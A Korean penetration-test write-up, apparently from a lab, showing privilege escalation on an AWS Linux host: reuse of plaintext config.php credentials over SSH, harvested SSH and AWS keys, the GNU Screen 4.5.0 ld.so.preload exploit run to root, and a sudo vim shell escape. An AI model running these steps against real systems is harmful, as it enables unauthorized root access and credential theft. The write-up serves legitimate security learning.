---
title: mod3postlinux — AWS Linux PrivEsc
date: 2026-06-19 00:00:00 +0900
categories:
- Pentest
tags: []
author: mmamm4
---

# mod3postlinux — AWS Linux PrivEsc

## 환경

AWS EC2 인스턴스(`172.31.144.54`). 초기 조건으로 `low` 계정 접근이 주어진 상태에서 시작했습니다. Kali(`10.8.1.98`)에서 kali_mcp를 통해 진행했습니다.

---

## 1. 정찰

먼저 포트부터 봤습니다.

```bash
nmap -T4 -F --open 172.31.144.54
nmap -T4 -sV -p 22,80 172.31.144.54
```

```
22/tcp  open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp  open  http  Apache httpd 2.4.29 (Ubuntu)
```

22, 80 두 개뿐이었습니다. 서비스 버전을 보니 둘 다 2017년 릴리즈 기준이라 Ubuntu 18.04 LTS 환경으로 추정했습니다 (`lsb_release`는 별도 확인하지 않았습니다).

searchsploit로 각 버전 취약점을 훑어봤습니다. SSH 쪽은 Username Enumeration 세 개가 걸렸는데 직접 RCE는 없었고, Apache 2.4.29에서 `linux/local/46676.php` — `apache2ctl graceful` 레이스 컨디션(2.4.17 ~ 2.4.38 범위)이 나왔습니다. 초기 접근이 주어진 상황이니 PrivEsc 시나리오에서 활용 가능한 후보로 메모해뒀습니다.

---

## 2. 열거

`low/password`로 접속해서 환경부터 훑었습니다.

```bash
id
# uid=1001(low) gid=1001(low) groups=1001(low),1002(webadmins)
```

`webadmins` 그룹이 눈에 띄었습니다. 웹 관련 파일에 쓰기 권한이 있을 수도 있다고 봤지만, 이 세션에서는 별도로 확인하지 않았습니다.

홈 디렉터리를 보니 `.ssh/`가 있었습니다.

```bash
ls -la ~/.ssh/
# -rw-------  sqladmin_id_rsa
# -rw-r--r--  sqladmin_id_rsa.pub
```

`sqladmin`이라는 이름의 RSA 키 쌍이 있었습니다. 공개키 코멘트를 보면 어느 서버에서 만들어진 키인지 나옵니다.

```bash
cat ~/.ssh/sqladmin_id_rsa.pub
# ssh-rsa AAAA... root@ip-172-31-139-223
```

`172.31.139.223` — 같은 VPC 안에 다른 인스턴스가 있다는 힌트입니다. 다만 이 세션에서 실제 연결 가능 여부를 확인했을 때 `No route to host`였습니다. 키 자체는 확보했으므로 나중에 네트워크 경로가 열리거나 다른 피벗 경로가 생기면 시도해볼 수 있는 후보입니다.

실행 중인 서비스와 포트도 확인했습니다. `ss -tunlp` 결과를 보니 외부에 열린 포트는 22, 80뿐이었고 로컬에 숨어있는 서비스도 없었습니다. DB가 안 보이는 게 조금 이상하다 싶었는데, `systemctl`에서도 mysql이나 postgresql은 없었습니다.

그래서 웹 루트를 직접 봤습니다.

```bash
ls -la /var/www/html/
# config.php
# index.html
# index.php
```

`config.php`가 있었습니다.

```bash
cat /var/www/html/config.php
```

```php
define('DB_NAME',     'production');
define('DB_USER',     'dbadmin');
define('DB_PASSWORD', 'S3cretP@ssw0rd');
define('DB_HOST',     'localhost');
```

DB 크리덴셜이 평문으로 박혀 있었습니다. DB가 실행 중이 아닌 상황에서 이 비밀번호가 OS 계정에 재사용됐을 가능성을 바로 생각했습니다.

```bash
ssh dbadmin@172.31.144.54  # password: S3cretP@ssw0rd
# uid=1002(dbadmin) gid=1003(dbadmin) groups=1003(dbadmin),1002(webadmins),1004(dbadmins)
```

크리덴셜 재사용이 그대로 맞았습니다. `dbadmins` 그룹까지 추가로 갖고 있었습니다.

한 가지 더 있었는데, 인터랙티브 SSH 세션에서 `env`를 돌려보니 `low` 계정 초기화 스크립트에 AWS 자격증명이 환경변수로 하드코딩돼 있었습니다.

```
AWS_ACCESS_KEY_ID=AKIA****************UZCB44T
AWS_SECRET_ACCESS_KEY=wJalrXUtn****************************EXAMPLEKEY
AWS_DEFAULT_REGION=us-west-2
```

non-interactive 세션(`env` 직접 실행)에서는 이 변수가 보이지 않았고 대화형 세션에서만 나타났습니다. `aws sts get-caller-identity`로 키 유효성 및 IAM 권한 수준은 확인하지 않았습니다. 유효한 키라면 계정 전체로 공격 범위가 넓어질 수 있는 후보이며, 추가 검증이 필요합니다.

---

## 3. 권한 상승

`/opt`를 뒤지다가 발견했습니다.

```bash
ls -la /opt/
# drwxr-xr-x  7  ubuntu  users  screen-4.5.0
```

GNU Screen 4.5.0이 `/opt`에 설치돼 있었습니다. searchsploit으로 확인해봤습니다.

```bash
searchsploit screen 4.5.0
# GNU Screen 4.5.0 - Local Privilege Escalation | linux/local/41154.sh
```

`41154.sh` — CVE-2017-5618입니다. Screen의 SUID 바이너리가 로그 파일을 쓸 때 `/etc/ld.so.preload`에 공격자 라이브러리를 주입할 수 있는 취약점입니다.

Kali에서 PoC를 복사해서 실행했습니다.

```bash
./41154.sh
```

```
[+] First, we create our shell and library...
/tmp/libhax.c: warning: implicit declaration of function 'chmod' ...
/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
collect2: error: ld returned 1 exit status
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!
No Sockets found in /tmp/screens/S-low.
```

컴파일 단계에서 `rootshell` 바이너리 생성이 실패했습니다. `/tmp` 쓰기 권한 제한으로 보였는데, 그럼에도 불구하고 `libhax.so`는 정상 컴파일됐고 `/etc/ld.so.preload` 인젝션 단계는 성공했습니다. Screen SUID가 트리거될 때 `libhax.so`가 로드되면서 권한 상승이 이뤄졌습니다.

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1001(low),1002(webadmins)
# uname -a
Linux ip-172-31-144-54 5.4.0-1085-aws #92~18.04.1-Ubuntu ...
```

root 권한을 획득했습니다.

---

## 4. 추가 PrivEsc 경로

이 세션에서 `sudo -l`을 별도로 확인하지는 않았습니다. 다만 초기 조건으로 `/usr/bin/vim`이 NOPASSWD sudo 설정돼 있다는 전제가 주어졌습니다. 실제라면 GTFOBins 패턴으로 바로 root 쉘이 나옵니다.

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

screen 취약점이 없더라도 이 경로가 성립한다면 동일하게 root 도달이 가능한 환경이 됩니다. 다음 세션에서 `sudo -l`로 독립 검증하는 것이 남아 있습니다.

---

## 정리

| 발견                               | 영향                              |
| -------------------------------- | ------------------------------- |
| `config.php` DB 크리덴셜 평문 노출       | `dbadmin` SSH 계정 탈취 (확인됨)       |
| 초기화 스크립트 AWS 키 하드코딩              | AWS 공격 가능성 (키 유효성 미검증)          |
| `.ssh/sqladmin_id_rsa`           | 172.31.139.223 피벗 후보 (현재 도달 불가) |
| GNU Screen 4.5.0 (CVE-2017-5618) | low → root (확인됨)                |
| sudo vim NOPASSWD                | low → root 경로 (전제조건, 미독립검증)     |

취약점 하나가 문제가 아니라, 크리덴셜 재사용 + 환경변수 노출 + 오래된 바이너리가 겹친 케이스였습니다. Screen PrivEsc 한 경로는 실증됐고, 거기서 AWS 키까지 이어지는 구조는 키 유효성 확인을 남긴 상태입니다.

---

**미해결 항목**:
- AWS 키(`AKIAIOSFODNN7H3UZCB44T`) 유효성 및 IAM 권한 — `aws sts get-caller-identity` 미실행
- sudo vim NOPASSWD — `sudo -l` 독립 실행 미완료
- 172.31.139.223 — 네트워크 경로 확보 시 재시도 필요
